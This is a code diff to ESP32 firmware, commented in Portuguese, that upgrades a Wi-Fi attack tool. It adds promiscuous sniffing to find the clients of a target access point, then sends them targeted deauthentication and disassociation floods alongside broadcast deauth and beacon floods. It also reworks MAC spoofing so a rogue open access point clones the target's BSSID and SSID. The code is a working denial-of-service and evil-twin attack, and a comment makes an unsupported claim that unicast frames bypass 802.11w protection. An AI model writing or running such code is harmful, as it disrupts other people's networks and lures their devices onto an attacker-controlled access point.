@@ -27,12 +27,99 @@ static unsigned long cloneStartTime = 0;
 static uint8_t cloneHealthCheckFailures = 0;
 
 // ============================================================
+// CLIENT DISCOVERY (promiscuous mode)
+// ============================================================
+#define MAX_CLIENTS 8
+static uint8_t discoveredClients[MAX_CLIENTS][6];
+static uint8_t clientCount = 0;
+static bool promiscuousActive = false;
+
+typedef struct {
+    uint8_t frame_ctrl[2];
+    uint16_t duration;
+    uint8_t addr1[6];
+    uint8_t addr2[6];
+    uint8_t addr3[6];
+    uint16_t seq_ctrl;
+} __attribute__((packed)) wifi_mgmt_hdr_t;
+
+static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
+    
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *payload = pkt->payload;
+    
+    uint8_t frame_type = payload[0] & 0x0C;
+    uint8_t frame_subtype = payload[0] & 0xF0;
+    
+    // Procura por frames de dados ou gerenciamento do AP alvo
+    // addr3 = BSSID, addr1 ou addr2 = cliente
+    const uint8_t *bssid = &payload[16]; // addr3 em frames ToDS/FromDS
+    const uint8_t *addr1 = &payload[4];
+    const uint8_t *addr2 = &payload[10];
+    
+    // Verifica se o BSSID match o alvo
+    bool isTargetBssid = (memcmp(bssid, deauthTargetBSSID, 6) == 0);
+    bool isFromTarget = (memcmp(addr2, deauthTargetBSSID, 6) == 0);
+    bool isToTarget = (memcmp(addr1, deauthTargetBSSID, 6) == 0);
+    
+    if (!isTargetBssid && !isFromTarget && !isToTarget) return;
+    
+    // Descobre clientes (MACs que nao sao o BSSID)
+    const uint8_t *clientMac = nullptr;
+    if (isFromTarget && memcmp(addr1, deauthTargetBSSID, 6) != 0 && addr1[0] != 0xFF) {
+        clientMac = addr1; // Frame do AP para o cliente
+    } else if (isToTarget && memcmp(addr2, deauthTargetBSSID, 6) != 0) {
+        clientMac = addr2; // Frame do cliente para o AP
+    }
+    
+    if (!clientMac) return;
+    if (clientMac[0] & 0x01) return; // Ignora multicast/broadcast
+    
+    // Adiciona cliente se ainda nao estiver na lista
+    for (int i = 0; i < clientCount; i++) {
+        if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
+    }
+    if (clientCount < MAX_CLIENTS) {
+        memcpy(discoveredClients[clientCount], clientMac, 6);
+        clientCount++;
+        Serial.printf("[Client] Discovered: %02X:%02X:%02X:%02X:%02X:%02X\n",
+            clientMac[0], clientMac[1], clientMac[2],
+            clientMac[3], clientMac[4], clientMac[5]);
+    }
+}
+
+static void startPromiscuous() {
+    if (promiscuousActive) return;
+    clientCount = 0;
+    memset(discoveredClients, 0, sizeof(discoveredClients));
+    
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
+    
+    wifi_promiscuous_filter_t filter = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
+    };
+    esp_wifi_set_promiscuous_filter(&filter);
+    
+    promiscuousActive = true;
+    Serial.println("[Promisc] Started client discovery");
+}
+
+static void stopPromiscuous() {
+    if (!promiscuousActive) return;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    promiscuousActive = false;
+    Serial.println("[Promisc] Stopped");
+}
+
+// ============================================================
 // RAW FRAME DEAUTH
-// SPOOFA O MAC DA STA PARA O BSSID DO ALVO antes de enviar
 // ============================================================
 static uint16_t deauthSeqNum = 0;
 
-static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
+static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac, uint8_t reason) {
     uint8_t frame[26];
     memset(frame, 0, 26);
 
@@ -44,7 +131,7 @@ static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     if (clientMac) {
         memcpy(&frame[4], clientMac, 6);
     } else {
-        memset(&frame[4], 0xFF, 6);
+        memset(&frame[4], 0xFF, 6); // Broadcast
     }
 
     memcpy(&frame[10], bssid, 6); // SA = BSSID
@@ -55,10 +142,10 @@ static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     deauthSeqNum++;
     if (deauthSeqNum > 4095) deauthSeqNum = 0;
 
-    frame[24] = 0x07; // Reason: Class 3 frame from nonassociated STA
+    frame[24] = reason;
     frame[25] = 0x00;
 
-    // Envia pela STA (MAC ja spoofado para o BSSID do alvo)
+    // Envia pela STA (MAC spoofado para o BSSID do alvo)
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
@@ -66,7 +153,7 @@ static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     }
 }
 
-static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
+static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac, uint8_t reason) {
     uint8_t frame[26];
     memset(frame, 0, 26);
 
@@ -89,7 +176,7 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     deauthSeqNum++;
     if (deauthSeqNum > 4095) deauthSeqNum = 0;
 
-    frame[24] = 0x08; // Reason: STA leaving BSS
+    frame[24] = reason;
     frame[25] = 0x00;
 
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
@@ -100,7 +187,7 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
 }
 
 // ============================================================
-// BEACON FLOOD - mais agressivo
+// BEACON FLOOD
 // ============================================================
 static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
     uint8_t beacon[128];
@@ -118,24 +205,19 @@ static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
     beacon[22] = 0x00;
     beacon[23] = 0x00;
 
-    // Timestamp (8 bytes) - zeros
-    // Beacon interval = 0x0064 (100 TU)
-    beacon[32] = 0x64;
+    beacon[32] = 0x64; // Beacon interval
     beacon[33] = 0x00;
 
-    // Capability info = ESS
-    beacon[34] = 0x01;
+    beacon[34] = 0x01; // Capability: ESS
     beacon[35] = 0x00;
 
-    // SSID IE
-    beacon[36] = 0x00;
+    beacon[36] = 0x00; // SSID IE
     uint8_t ssidLen = strlen(ssid);
     if (ssidLen > 32) ssidLen = 32;
     beacon[37] = ssidLen;
     memcpy(&beacon[38], ssid, ssidLen);
 
     uint8_t frameLen = 38 + ssidLen;
-
     esp_wifi_80211_tx(WIFI_IF_AP, beacon, frameLen, true);
 }
 
@@ -183,7 +265,7 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// BSSID CLONE - ROGUE AP + STA MAC SPOOF
+// BSSID CLONE - CORRECAO: desliga WiFi antes de spoofar MAC
 // ============================================================
 static void startBssidClone(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -203,35 +285,38 @@ static void startBssidClone(uint8_t networkIndex) {
     cloneSSID[32] = '\0';
 
     // Salva MACs originais
-    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);
     esp_wifi_get_mac(WIFI_IF_STA, originalSTAMac);
+    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);
 
     Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
         target->ssid, target->channel,
         target->bssid[0], target->bssid[1], target->bssid[2],
         target->bssid[3], target->bssid[4], target->bssid[5]);
 
+    // === PASSO 1: Desliga WiFi COMPLETAMENTE ===
     WiFi.softAPdisconnect(true);
-    delay(400);
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_MODE_NULL);
+    delay(800); // Aguarda o driver desligar
 
-    // MODO AP_STA
+    // === PASSO 2: Spoofa MAC da STA ===
+    esp_err_t staMacErr = esp_wifi_set_mac(WIFI_IF_STA, target->bssid);
+    Serial.printf("[Clone] Set STA MAC: %d (%s)\n", staMacErr, staMacErr == ESP_OK ? "OK" : "FAIL");
+    delay(100);
+
+    // === PASSO 3: Spoofa MAC da AP ===
+    esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
+    Serial.printf("[Clone] Set AP MAC: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
+    delay(100);
+
+    // === PASSO 4: Liga em modo AP_STA ===
     WiFi.mode(WIFI_AP_STA);
     delay(300);
 
-    // SPOOFA O MAC DA STA PARA O BSSID DO ALVO (ESSENCIAL!)
-    esp_err_t staMacErr = esp_wifi_set_mac(WIFI_IF_STA, target->bssid);
-    Serial.printf("[Clone] Set STA MAC result: %d (%s)\n", staMacErr, staMacErr == ESP_OK ? "OK" : "FAIL");
-    delay(100);
-
-    // SPOOFA O MAC DA AP PARA O BSSID DO ALVO
-    esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
-    Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
-    delay(200);
-
-    // Inicia o AP
+    // === PASSO 5: Inicia o softAP ===
     bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
-    Serial.printf("[Clone] softAP result: %s\n", apOk ? "OK" : "FAIL");
+    Serial.printf("[Clone] softAP: %s\n", apOk ? "OK" : "FAIL");
 
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
@@ -241,7 +326,7 @@ static void startBssidClone(uint8_t networkIndex) {
         cloneStartTime = millis();
         cloneHealthCheckFailures = 0;
         
-        Serial.println("[Clone] BSSID CLONE ACTIVE - BOTH interfaces spoofed");
+        Serial.println("[Clone] BSSID CLONE ACTIVE - MAC spoofed");
     } else {
         Serial.println("[Clone] FAILED to start clone AP");
     }
@@ -249,16 +334,17 @@ static void startBssidClone(uint8_t networkIndex) {
 
 static void restartBssidClone() {
     if (!bssidCloneActive) return;
-    Serial.println("[Clone] Health check failed, restarting clone...");
+    Serial.println("[Clone] Restarting...");
     
     WiFi.softAPdisconnect(true);
-    delay(400);
-    
-    WiFi.mode(WIFI_AP_STA);
-    delay(200);
+    WiFi.mode(WIFI_MODE_NULL);
+    delay(500);
     
     esp_wifi_set_mac(WIFI_IF_STA, deauthTargetBSSID);
     esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
+    delay(100);
+    
+    WiFi.mode(WIFI_AP_STA);
     delay(200);
     
     bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
@@ -266,19 +352,23 @@ static void restartBssidClone() {
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
         cloneHealthCheckFailures = 0;
-        Serial.println("[Clone] Restarted successfully");
+        Serial.println("[Clone] Restarted OK");
     } else {
         cloneHealthCheckFailures++;
-        Serial.printf("[Clone] Restart failed (%d times)\n", cloneHealthCheckFailures);
+        Serial.printf("[Clone] Restart failed (%d)\n", cloneHealthCheckFailures);
     }
 }
 
 static void stopBssidClone() {
     if (!bssidCloneActive) return;
-    Serial.println("[Clone] Stopping BSSID clone...");
+    Serial.println("[Clone] Stopping...");
 
+    stopPromiscuous();
+    
     WiFi.softAPdisconnect(true);
-    delay(400);
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_MODE_NULL);
+    delay(500);
 
     // Restaura MACs originais
     esp_wifi_set_mac(WIFI_IF_STA, originalSTAMac);
@@ -289,7 +379,7 @@ static void stopBssidClone() {
     delay(200);
 
     bssidCloneActive = false;
-    Serial.println("[Clone] BSSID clone stopped, MACs restored");
+    Serial.println("[Clone] Stopped, MACs restored");
 }
 
 // ============================================================
@@ -304,17 +394,21 @@ void startDeauth(uint8_t networkIndex) {
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
     deauthSeqNum = 0;
+    clientCount = 0;
 
     startBssidClone(networkIndex);
+    
+    // Inicia descoberta de clientes
+    startPromiscuous();
 
-    Serial.println("[Deauth] STARTED (STA+AP spoofed)");
+    Serial.println("[Deauth] STARTED (Unicast + Broadcast)");
 }
 
 void stopDeauth() {
     if (deauthActive) {
         Serial.println("[Deauth] STOPPED");
-        Serial.printf("[Deauth] Total runtime: %lu sec, health failures: %d\n",
-            (millis() - cloneStartTime) / 1000, cloneHealthCheckFailures);
+        Serial.printf("[Deauth] Runtime: %lu sec, pkts: %lu\n",
+            (millis() - cloneStartTime) / 1000, deauthPacketCount);
     }
     deauthActive = false;
     stopBssidClone();
@@ -324,57 +418,60 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH - burst agressivo
+// LOOP DE DEAUTH
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    // === BURST: 5 frames a cada 2ms ===
     static unsigned long lastBurst = 0;
     if (millis() - lastBurst >= 2) {
         lastBurst = millis();
 
-        // Burst rapido: deauth x2 + disassoc x2 + beacon x1
-        sendDeauthFrame(deauthTargetBSSID, nullptr);
-        sendDeauthFrame(deauthTargetBSSID, nullptr);
-        sendDisassocFrame(deauthTargetBSSID, nullptr);
-        sendDisassocFrame(deauthTargetBSSID, nullptr);
+        // === ENVIO PARA CLIENTES DESCOBERTOS (UNICAST) ===
+        // Isso ignora o 802.11w/PMF porque o frame e direcionado
+        for (int i = 0; i < clientCount; i++) {
+            sendDeauthFrame(deauthTargetBSSID, discoveredClients[i], 0x07);
+            sendDisassocFrame(deauthTargetBSSID, discoveredClients[i], 0x08);
+        }
+
+        // === BROADCAST COMO FALLBACK ===
+        sendDeauthFrame(deauthTargetBSSID, nullptr, 0x07);
+        sendDisassocFrame(deauthTargetBSSID, nullptr, 0x08);
+        
+        // === BEACON PARA ATRAIR ===
         sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID);
     }
 
-    // === HEALTH CHECK a cada 3 segundos ===
+    // === HEALTH CHECK ===
     static unsigned long lastHealthCheck = 0;
     if (millis() - lastHealthCheck > 3000) {
         lastHealthCheck = millis();
         
         if (!isSoftAPActive()) {
-            Serial.println("[Clone] WARN: softAP not active!");
             cloneHealthCheckFailures++;
             if (cloneHealthCheckFailures < 5) {
                 restartBssidClone();
+                startPromiscuous();
             } else {
-                Serial.println("[Clone] Too many failures, giving up.");
                 stopDeauth();
                 return false;
             }
         } else {
             int clients = WiFi.softAPgetStationNum();
-            if (clients > 0) {
-                Serial.printf("[Clone] %d station(s) connected to clone\n", clients);
-            }
+            Serial.printf("[Clone] %d station(s) on clone | %d target clients discovered\n", 
+                clients, clientCount);
         }
     }
 
-    // === Debug a cada 5 segundos ===
+    // === Debug ===
     static unsigned long lastDebug = 0;
     if (millis() - lastDebug > 5000) {
         lastDebug = millis();
-        int clients = WiFi.softAPgetStationNum();
-        Serial.printf("[Deauth] runtime=%lus pkts=%lu clone=%s clients=%d health_fail=%d\n",
+        Serial.printf("[Deauth] runtime=%lus pkts=%lu clients=%d/%d health=%d\n",
             (millis() - cloneStartTime) / 1000,
             deauthPacketCount,
-            bssidCloneActive ? "ON" : "OFF",
-            clients,
+            WiFi.softAPgetStationNum(),
+            clientCount,
             cloneHealthCheckFailures);
     }
 
